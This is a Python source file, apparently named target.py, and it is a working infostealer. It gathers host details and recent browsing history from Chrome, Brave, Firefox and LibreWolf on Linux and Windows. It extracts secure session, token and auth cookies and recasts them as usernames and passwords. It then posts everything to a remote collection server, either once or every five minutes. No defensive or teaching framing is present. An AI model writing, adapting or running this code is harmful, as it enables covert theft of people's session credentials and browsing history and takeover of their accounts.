import os
import sys
import platform
import socket
import uuid
import time
import json
import requests
import sqlite3
import tempfile
import browser_cookie3
import psutil
from datetime import datetime, timedelta

# ========== CONFIG ==========
SERVER_URL = "http://127.0.0.1:5000"  # Change in deployment
MACHINE_ID = str(uuid.getnode())

# ========== SYSTEM INFO ==========
def get_system_info():
    try:
        return {
            "machine_id": MACHINE_ID,
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "os_info": f"{platform.system()} {platform.release()}"
        }
    except Exception as e:
        return {"machine_id": MACHINE_ID, "error": str(e)}

# ========== UTILITIES ==========
def chrome_ts(ts): return (datetime(1601, 1, 1) + timedelta(microseconds=ts)).isoformat()
def firefox_ts(ts): return datetime.fromtimestamp(ts / 1_000_000).isoformat()

def extract_history_from_sqlite(path, query, parse_row_fn):
    if not os.path.exists(path):
        return []
    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        temp_path = tmp.name
    try:
        os.system(f"cp '{path}' '{temp_path}'")
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute(query)
        history = [parse_row_fn(row) for row in cursor.fetchall()]
        conn.close()
        return history
    except Exception:
        return []
    finally:
        os.remove(temp_path)

def extract_history_generic(name, base_path, db_subpath, query, parser, profile_match="default", file="History"):
    if not os.path.exists(base_path):
        return []
    path = base_path
    if os.path.isdir(base_path):
        profiles = [d for d in os.listdir(base_path) if profile_match in d]
        if not profiles:
            return []
        path = os.path.join(base_path, profiles[0], file)
    full_path = os.path.join(path, db_subpath) if db_subpath else path
    return extract_history_from_sqlite(full_path, query, parser)

# ========== HISTORY COLLECTION ==========
def get_browser_history():
    results = []
    system = platform.system()

    if system == "Linux":
        results += extract_history_generic(
            "chrome",
            os.path.expanduser("~/.config/google-chrome/Default"),
            "History",
            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100",
            lambda r: {"url": r[0], "title": r[1], "visit_time": chrome_ts(r[2]), "browser_type": "chrome"}
        )
        results += extract_history_generic(
            "brave",
            os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/Default"),
            "History",
            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100",
            lambda r: {"url": r[0], "title": r[1], "visit_time": chrome_ts(r[2]), "browser_type": "brave"}
        )
        results += extract_history_generic(
            "firefox",
            os.path.expanduser("~/.mozilla/firefox"),
            "places.sqlite",
            "SELECT url, title, visit_date FROM moz_places JOIN moz_historyvisits ON moz_historyvisits.place_id = moz_places.id ORDER BY visit_date DESC LIMIT 100",
            lambda r: {"url": r[0], "title": r[1], "visit_time": firefox_ts(r[2]), "browser_type": "firefox"}
        )
        results += extract_history_generic(
            "librewolf",
            os.path.expanduser("~/.librewolf"),
            "places.sqlite",
            "SELECT url, title, visit_date FROM moz_places JOIN moz_historyvisits ON moz_historyvisits.place_id = moz_places.id ORDER BY visit_date DESC LIMIT 100",
            lambda r: {"url": r[0], "title": r[1], "visit_time": firefox_ts(r[2]), "browser_type": "librewolf"}
        )

    elif system == "Windows":
        local = os.getenv("LOCALAPPDATA", "")
        results += extract_history_generic(
            "chrome",
            os.path.join(local, "Google\\Chrome\\User Data\\Default"),
            "History",
            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100",
            lambda r: {"url": r[0], "title": r[1], "visit_time": chrome_ts(r[2]), "browser_type": "chrome"}
        )
        results += extract_history_generic(
            "brave",
            os.path.join(local, "BraveSoftware\\Brave-Browser\\User Data\\Default"),
            "History",
            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100",
            lambda r: {"url": r[0], "title": r[1], "visit_time": chrome_ts(r[2]), "browser_type": "brave"}
        )
        results += extract_history_generic(
            "firefox",
            os.path.join(local, "Mozilla\\Firefox\\Profiles"),
            "places.sqlite",
            "SELECT url, title, visit_date FROM moz_places JOIN moz_historyvisits ON moz_historyvisits.place_id = moz_places.id ORDER BY visit_date DESC LIMIT 100",
            lambda r: {"url": r[0], "title": r[1], "visit_time": firefox_ts(r[2]), "browser_type": "firefox"}
        )
        results += extract_history_generic(
            "librewolf",
            os.path.join(local, "LibreWolf\\Profiles"),
            "places.sqlite",
            "SELECT url, title, visit_date FROM moz_places JOIN moz_historyvisits ON moz_historyvisits.place_id = moz_places.id ORDER BY visit_date DESC LIMIT 100",
            lambda r: {"url": r[0], "title": r[1], "visit_time": firefox_ts(r[2]), "browser_type": "librewolf"}
        )

    return results

# ========== CREDENTIAL COLLECTION ==========
def get_saved_credentials():
    credentials = []
    browsers = [
        ("chrome", browser_cookie3.chrome),
        ("firefox", browser_cookie3.firefox),
        ("brave", browser_cookie3.brave),
        ("librewolf", browser_cookie3.librewolf)
    ]
    keywords = {"session", "token", "auth"}

    for name, func in browsers:
        try:
            for cookie in func():
                if cookie.secure and cookie.name.lower() in keywords:
                    credentials.append({
                        "website": cookie.domain,
                        "username": cookie.name,
                        "password": cookie.value,
                        "browser_type": name
                    })
        except Exception:
            continue

    return credentials

# ========== COMMUNICATION ==========
def register_machine():
    try:
        r = requests.post(f"{SERVER_URL}/register", json=get_system_info(), timeout=5)
        return r.ok
    except requests.RequestException:
        return False

def send_data_once():
    try:
        requests.post(f"{SERVER_URL}/submit/history", json={
            "machine_id": MACHINE_ID,
            "history": get_browser_history()
        }, timeout=10)
        requests.post(f"{SERVER_URL}/submit/credentials", json={
            "machine_id": MACHINE_ID,
            "credentials": get_saved_credentials()
        }, timeout=10)
    except requests.RequestException:
        pass

# ========== EXECUTION MODES ==========
def main_loop():
    while True:
        if register_machine():
            send_data_once()
        time.sleep(300)

def one_shot():
    if register_machine():
        send_data_once()

# ========== ENTRYPOINT ==========
if __name__ == "__main__":
    arg = sys.argv[1] if len(sys.argv) > 1 else None
    if arg == "--once":
        one_shot()
    elif arg == "--loop":
        main_loop()
    else:
        print("Usage: python target.py --once | --loop")
